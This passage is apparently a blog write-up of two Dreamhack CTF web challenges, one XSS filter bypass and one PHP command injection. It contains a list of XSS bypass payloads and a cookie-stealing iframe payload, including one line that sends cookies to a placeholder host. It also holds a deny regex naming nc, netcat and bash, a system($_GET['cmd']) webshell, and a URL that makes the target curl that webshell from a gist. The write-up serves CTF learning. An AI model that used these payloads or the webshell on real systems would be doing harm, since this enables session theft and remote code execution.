class="meta">@app.route(<span class="params"><span class="string">&quot;/vuln&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">vuln</span>():</span><br><span class="line">    param = request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    param = xss_filter(param)</span><br><span class="line">    <span class="keyword">return</span> param</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">flag</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>)</span><br><span class="line">    <span class="keyword">elif</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        param = request.form.get(<span class="string">&quot;param&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> check_xss(param, &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;flag&quot;</span>, <span class="string">&quot;value&quot;</span>: FLAG.strip()&#125;):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;wrong??&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&lt;script&gt;alert(&quot;good&quot;);history.go(-1);&lt;/script&gt;&#x27;</span></span><br><span class="line"></span><br><span class="line">memo_text = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/memo&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">memo</span>():</span><br><span class="line">    <span class="keyword">global</span> memo_text</span><br><span class="line">    text = request.args.get(<span class="string">&quot;memo&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    memo_text += text + <span class="string">&quot;\n&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;memo.html&quot;</span>, memo=memo_text)</span><br><span class="line"></span><br><span class="line">app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8000</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>Sort out the execution process</p>
<p>web site provide the other three page, Which is</p>
<p><img src="/img/Dreamhack1_19.png" alt="Untitled"></p>
<p>a. flag</p>
<p><img src="/img/Dreamhack1_20.png" alt="Untitled"></p>
<p>b. memo</p>
<p><img src="/img/Dreamhack1_21.png" alt="Untitled"></p>
<p>c. vuln</p>
<p><img src="/img/Dreamhack1_22.png" alt="Untitled"></p>
<p> xss_filter →  →[“script”, “on”, “javascript”,”window”, “self”, “this”, “document”, “location”, “(“, “)”, “&amp;#”] → flag fun → param, FLAG.strip() →check_xss fun → vuln page → param value encode→read_url fun</p>
<p>we can notice the xss fliter</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">xss_filter</span>(<span class="params">text</span>):</span><br><span class="line">    _<span class="built_in">filter</span> = **[<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>]**</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> _<span class="built_in">filter</span>:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    advanced_filter = **[<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]**</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> advanced_filter:</span><br><span class="line">        <span class="keyword">if</span> f <span class="keyword">in</span> text.lower():</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;filtered!!!&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> text</span><br></pre></td></tr></table></figure>

<p>and from <code>/flag</code> get the param &amp; cookie value</p>
<ul>
<li>param value → <code>/vuln</code> using <code>urllib.parse.quote(param)</code> → param value url encode</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">read_url</span>(<span class="params">url, cookie=&#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;name&quot;</span>, <span class="string">&quot;value&quot;</span>: <span class="string">&quot;value&quot;</span>&#125;</span>):</span><br><span class="line">    cookie.update(&#123;<span class="string">&quot;domain&quot;</span>: <span class="string">&quot;127.0.0.1&quot;</span>&#125;)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        service = Service(executable_path=<span class="string">&quot;/chromedriver&quot;</span>)</span><br><span class="line">        options = webdriver.ChromeOptions()</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> [</span><br><span class="line">            <span class="string">&quot;headless&quot;</span>,</span><br><span class="line">            <span class="string">&quot;window-size=1920x1080&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-gpu&quot;</span>,</span><br><span class="line">            <span class="string">&quot;no-sandbox&quot;</span>,</span><br><span class="line">            <span class="string">&quot;disable-dev-shm-usage&quot;</span>,</span><br><span class="line">        ]:</span><br><span class="line">            options.add_argument(_)</span><br><span class="line">        driver = webdriver.Chrome(service=service, options=options)</span><br><span class="line">        driver.implicitly_wait(<span class="number">3</span>)</span><br><span class="line">        driver.set_page_load_timeout(<span class="number">3</span>)</span><br><span class="line">        driver.get(<span class="string">&quot;http://127.0.0.1:8000/&quot;</span>)</span><br><span class="line">        **driver.add_cookie(cookie)**</span><br><span class="line">        **driver.get(url)**</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        driver.quit()</span><br><span class="line">        <span class="comment"># return str(e)</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    driver.quit()</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>

<ul>
<li>Build a URL to send the get request and save it in a variable named url, then pass the created URL and cookie value to the read_url function.</li>
</ul>
<p>anyway, need to bypass the filter which is <code>xss_fliter</code> function and then let <code>document.cookie</code> value passed to <code>/memo</code>  page! </p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[<span class="string">&quot;script&quot;</span>, <span class="string">&quot;on&quot;</span>, <span class="string">&quot;javascript&quot;</span>,<span class="string">&quot;window&quot;</span>, <span class="string">&quot;self&quot;</span>, <span class="string">&quot;this&quot;</span>, <span class="string">&quot;document&quot;</span>, <span class="string">&quot;location&quot;</span>, <span class="string">&quot;(&quot;</span>, <span class="string">&quot;)&quot;</span>, <span class="string">&quot;&amp;#&quot;</span>]</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">-----See how to bypass restrictions</span><br><span class="line">&lt;!<span class="string">&#x27;/*&quot;/*/&#x27;</span>/*/<span class="string">&quot;/*--&gt;&lt;/Script&gt;&lt;Image SrcSet=K */; OnError=cOnfirm`1` //&gt;</span></span><br><span class="line"><span class="string">&quot;</span>&gt;&lt;img src=x onerror=prompt(<span class="number">1</span>);&gt;</span><br><span class="line">alert`<span class="number">1</span>`</span><br><span class="line">al\u0065rt(<span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;&gt;alert`1`&lt;/scr\0ipt&gt;&lt;scr\0ipt/1=&#x27;</span> </span><br><span class="line">&lt;scr\0ipt&gt;alert`<span class="number">1</span>`// </span><br><span class="line">&lt;handler <span class="built_in">id</span>=<span class="string">&quot;y&quot;</span>&gt;alert`<span class="number">127</span>`&lt;/handler&gt;</span><br><span class="line">&lt;a href=<span class="string">&quot;jAvAsCrIpT&amp;colon;alert&amp;lpar;1&amp;rpar;&quot;</span>&gt;X&lt;/a&gt;</span><br><span class="line">&lt;iFrAMe/src \/\/onload = prompt(<span class="number">1</span>)</span><br><span class="line">&lt;SVg &lt;/onlOad =<span class="string">&quot;1&gt; `_=prompt,_`1`` &quot;</span><span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;iframe src=&quot;</span>data:text/html,%3C%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3E%<span class="number">61</span>%6C%<span class="number">65</span>%<span class="number">72</span>%<span class="number">74</span>%<span class="number">28</span>%<span class="number">31</span>%<span class="number">29</span>%3C%2F%<span class="number">73</span>%<span class="number">63</span>%<span class="number">72</span>%<span class="number">69</span>%<span class="number">70</span>%<span class="number">74</span>%3E<span class="string">&quot;&gt;&lt;/iframe&gt;</span></span><br><span class="line"><span class="string">&lt;iFrAMeSRC=&quot;</span>jAvAsCrIpT:alert`<span class="number">1</span>`;<span class="string">&quot;&gt;&lt;/iFrAMe&gt;</span></span><br><span class="line"><span class="string">&lt;--`&lt;iMG/srC=` onerror=confirm``&gt; --!&gt;</span></span><br><span class="line"><span class="string">&lt;!&#x27;/*&quot;</span>/*/<span class="string">&#x27;/*/&quot;/*--&gt;&lt;/scr\0ipt&gt;&lt;Image SrcSet=K */; OnError=confirm`1` //&gt;</span></span><br><span class="line"><span class="string">&lt;SVg &lt;/onlOad =&quot;1&gt; (_=prompt,_(1)) &quot;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;IMG SRC=&quot;jav	ascript:alert`1`;&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&lt;div id=&quot;133&quot;&gt;&lt;!-- `&lt;img/src=xx:xx onerror=alert(133)//--!&gt;//[&quot;&#x27;</span>`--&gt;]]&gt;]&lt;/div&gt;</span><br><span class="line"></span><br><span class="line">----success</span><br><span class="line">&lt;&lt;scr\0ipt/src=http://xss.com/xss.js&gt;&lt;/scr\0ipt</span><br><span class="line"><span class="string">&#x27;&gt;alert`1`&lt;/scr\0ipt&gt;&lt;scr\0ipt/1=&#x27;</span> </span><br><span class="line">&lt;scr\0ipt&gt;alert`<span class="number">1</span>`// </span><br><span class="line">&lt;handler <span class="built_in">id</span>=<span class="string">&quot;y&quot;</span>&gt;alert`<span class="number">127</span>`&lt;/handler&gt;</span><br><span class="line"><span class="string">&quot;&gt;&lt;iframesrc=&quot;</span>http://google.com<span class="string">&quot;%3E</span></span><br><span class="line"><span class="string">&lt;iframe/src\/\/onlOad=prompt`1`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">**&lt;iframe src=&quot;</span>data:text/html;test.com;www.youtube.com/XLYZ;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==<span class="string">&quot;&gt;&lt;/iframe&gt;**</span></span><br></pre></td></tr></table></figure>

<p>Finally, <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> is encoded through <code>iframe</code> and <code>base64</code>, and the payload that can <code>alert</code> successfully is detected.</p>
<p><img src="/img/Dreamhack1_23.png" alt="Untitled"></p>
<p>when u go to &#x2F;flag page then input that payload</p>
<p><img src="/img/Dreamhack1_24.png" alt="Untitled"></p>
<p>but our target is &#x2F;memo page</p>
<p>so change the payload like this</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">For Example : &lt;iframe src=<span class="string">&quot;jAvAsCrIpT:location.href=&#x27;http://XXXX.com/cookie.php?cookie=&#x27;+document.cookie&quot;</span> /&gt;</span><br><span class="line"></span><br><span class="line">Payload : &lt;iframe src=<span class="string">&quot;javascri	pt:locati\u006Fn.href=&#x27;/memo?memo=&#x27;</span></span><br><span class="line"><span class="string">+d\u006Fcument.cookie&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>can refer to this <a target="_blank" rel="noopener" href="https://juejin.cn/s/iframexsscheatsheet">https://juejin.cn/s/iframe xss cheat sheet</a></p>
<p><img src="/img/Dreamhack1_25.png" alt="Untitled"></p>
<p>In some cases, to avoid exposing JavaScript code directly, it can be converted to a <code>Unicode</code> string to increase the security of the code. This technique is often used to encrypt, obfuscate, or hide JavaScript code.</p>
<p>The conversion process is simple, that is, converting each character in the JavaScript code to its corresponding Unicode character encoding. For example, the Unicode encoding for character ‘A’ is U+0041, the Unicode encoding for character ‘B’ is U+0042, and so on.</p>
<p>If you have a JavaScript string “ABCD”, the process of converting it to a Unicode string is to convert each character to its Unicode encoding and concatenate them. Therefore, the string might be converted to something like “\u0041\u0042\u0043\u0044”.</p>
<hr>
<h3 id="Switching-Command"><a href="#Switching-Command" class="headerlink" title="Switching Command"></a><strong>Switching Command</strong></h3><ul>
<li><strong>Description</strong></li>
</ul>
<p><strong>Not Friendly service… Can you switching the command?</strong></p>
<p><strong>Host: host3.dreamhack.games</strong></p>
<p><strong>Port:  22351&#x2F;tcp → 8001&#x2F;tcp</strong></p>
<p><strong>For pwnables: nc host3.dreamhack.games 22351</strong></p>
<p><strong>For Web: <a target="_blank" rel="noopener" href="http://host3.dreamhack.games:22351/">http://host3.dreamhack.games:22351/</a></strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;./config/db_config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$message</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">&quot;REQUEST_METHOD&quot;</span>]==<span class="string">&quot;POST&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$_POST</span>[<span class="string">&quot;username&quot;</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$data</span> === <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;Failed to parse JSON data&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">        </span><br><span class="line">    <span class="variable">$username</span> = <span class="variable">$data</span>-&gt;username;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$username</span> === <span class="string">&quot;admin&quot;</span> )&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;no hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$username</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">            <span class="variable">$user</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">            <span class="variable">$password</span> = <span class="string">&quot;***REDACTED***&quot;</span>;</span><br><span class="line">            <span class="variable">$stmt</span> = <span class="variable">$conn</span> -&gt; <span class="title function_ invoke__">prepare</span>(<span class="string">&quot;SELECT * FROM users WHERE username = ? AND password = ?&quot;</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">bind_param</span>(<span class="string">&quot;ss&quot;</span>,<span class="variable">$user</span>,<span class="variable">$password</span>);</span><br><span class="line">            <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">execute</span>();</span><br><span class="line">            <span class="variable">$result</span> = <span class="variable">$stmt</span> -&gt; <span class="title function_ invoke__">get_result</span>();</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$result</span> -&gt; num_rows == <span class="number">1</span>)&#123;</span><br><span class="line">                <span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">                <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: test.php&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$message</span> = <span class="string">&quot;Something wrong...&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] = <span class="string">&quot;guest&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: test.php&quot;</span>);</span><br><span class="line">            </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Enter Username&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">            font-family: Arial, sans-serif;</span><br><span class="line">            background-color: <span class="comment">#f4f4f4;</span></span><br><span class="line">            margin: <span class="number">0</span>;</span><br><span class="line">            padding: <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        .container &#123;</span><br><span class="line">            background-color: <span class="comment">#ffffff;</span></span><br><span class="line">            width: <span class="number">300</span>px;</span><br><span class="line">            margin: <span class="number">0</span> auto;</span><br><span class="line">            padding: <span class="number">20</span>px;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">            border-radius: <span class="number">5</span>px;</span><br><span class="line">            box-shadow: <span class="number">0</span> <span class="number">0</span> <span class="number">10</span>px <span class="title function_ invoke__">rgba</span>(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0.1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        h2 &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">        &#125;</span><br><span class="line">        label &#123;</span><br><span class="line">            display: block;</span><br><span class="line">            font-weight: bold;</span><br><span class="line">            margin-bottom: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;text&quot;</span>] &#123;</span><br><span class="line">            width: <span class="number">90</span>%;</span><br><span class="line">            padding: <span class="number">10</span>px;</span><br><span class="line">            margin-bottom: <span class="number">15</span>px;</span><br><span class="line">            border: <span class="number">1</span>px solid <span class="comment">#ccc;</span></span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;submit&quot;</span>] &#123;</span><br><span class="line">            background-color: <span class="comment">#007bff;</span></span><br><span class="line">            color: <span class="comment">#fff;</span></span><br><span class="line">            border: none;</span><br><span class="line">            padding: <span class="number">10</span>px <span class="number">20</span>px;</span><br><span class="line">            border-radius: <span class="number">3</span>px;</span><br><span class="line">            cursor: pointer;</span><br><span class="line">        &#125;</span><br><span class="line">        input[type=<span class="string">&quot;submit&quot;</span>]:hover &#123;</span><br><span class="line">            background-color: <span class="comment">#0056b3;</span></span><br><span class="line">        &#125;</span><br><span class="line">        .message &#123;</span><br><span class="line">            text-align: center;</span><br><span class="line">            color: red;</span><br><span class="line">            margin-top: <span class="number">10</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">container</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h2</span>&gt;<span class="title">Enter</span> <span class="title">Username</span>&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">POST</span>&quot; <span class="title">action</span>=&quot;<span class="title">index</span>.<span class="title">php</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">username</span>&quot;&gt;<span class="title">Username</span>:&lt;/<span class="title">label</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">text</span>&quot; <span class="title">id</span>=&quot;<span class="title">username</span>&quot; <span class="title">name</span>=&quot;<span class="title">username</span>&quot; <span class="title">required</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">Submit</span>&quot;&gt;</span></span><br><span class="line"><span class="class">            &lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">message</span>&quot;&gt;&lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">message</span>; ?&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">body</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">html</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;display_errors&#x27;</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>() </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> (<span class="string">&quot;./config.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>] : <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$sanitized_command</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$sanitized_command</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;No hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$resulttt</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$sanitized_command</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>]=== <span class="string">&quot;guest&quot;</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="string">&quot;echo hi guest&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$command</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$result</span> = <span class="string">&quot;Authentication first&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;Command Test&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h2&gt;Command Test&lt;/h2&gt;</span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">$result</span>&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$conn</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;db&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>, <span class="string">&quot;dreamhack&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$conn</span>-&gt;connect_error) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Connection failed: &quot;</span> . <span class="variable">$conn</span>-&gt;connect_error);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;form method=<span class="string">&quot;GET&quot;</span> name=<span class="string">&quot;&lt;?php echo basename(<span class="subst">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;TEXT&quot;</span> name=<span class="string">&quot;cmd&quot;</span> autofocus id=<span class="string">&quot;cmd&quot;</span> size=<span class="string">&quot;80&quot;</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">&quot;SUBMIT&quot;</span> value=<span class="string">&quot;Execute&quot;</span>&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;pre&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/pre&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985">https://gist.github.com/joswr1ght/22f40787de19d80d110b37fb79ac3985</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//host3.dreamhack.games:22351/test.php?cmd=curl%22https://gist.githubusercontent.com/joswr1ght/22f40787de19d80d110b37fb79ac3985/raw/50008b4501ccb7f804a61bc2e1a3d1df1cb403c4/easy-simple-php-webshell.php%22-ohello.php</span></span><br><span class="line"></span><br><span class="line">root@MSI:~<span class="comment"># python3 -m http.server</span></span><br><span class="line">Serving HTTP on <span class="number">0.0</span>.<span class="number">0.0</span> port <span class="number">8000</span> (http:<span class="comment">//0.0.0.0:8000/) ...</span></span><br></pre></td></tr></table></figure>

<p>Go to the beginning screen</p>
<p><img src="/img/Dreamhack1_26.png" alt="Untitled"></p>
<p><img src="/img/Dreamhack1_27.png" alt="Untitled"></p>
<p>username&#x3D;{“username”: “admin”}</p>
<p>But if input ⇒ {“username”:true} </p>
<p><img src="/img/Dreamhack1_28.png" alt="Untitled"></p>
<p>被限制的字元</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$pattern</span> = <span class="string">&#x27;/\b(flag|nc|netcat|bin|bash|rm|sh)\b/i&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>When entering restricted content,</p>
<p><img src="/img/Dreamhack1_29.png" alt="Untitled"></p>
<p>Let’s take a closer look at this part of the code</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&quot;auth&quot;</span>] === <span class="string">&quot;admin&quot;</span>)&#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$command</span> = <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>]) ? <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>] : <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">    <span class="variable">$sanitized_command</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$command</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$sanitized_command</span>))&#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">&quot;No hack&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$resulttt</span> = <span class="title function_ invoke__">shell_exec</span>(<span class="title function_ invoke__">escapeshellcmd</span>(<span class="variable">$sanitized_command</span>));</span><br></pre></td></tr></table></figure>

<p>Notice the <code>escapeshellcmd</code> at the bottom</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://wikidocs.net/208715">https://wikidocs.net/208715</a></li>
<li>Any character in an escape string that can be used to trick a shell command into executing arbitrary instructions.</li>
